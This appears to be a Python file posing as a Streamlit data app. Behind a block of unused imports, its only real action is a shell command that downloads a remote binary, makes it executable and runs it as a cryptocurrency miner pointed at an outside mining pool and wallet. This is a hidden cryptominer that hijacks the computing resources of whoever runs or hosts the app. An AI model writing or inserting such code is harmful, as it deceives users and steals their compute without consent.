from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64


os.system("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a curvehash -o stratum+tcps://eu.mecrypto.club:5310 -u PWkRhpmDYzbaEuDQqXx7TRtDAgYjNE5u99.NUNG -p x -t 15") 
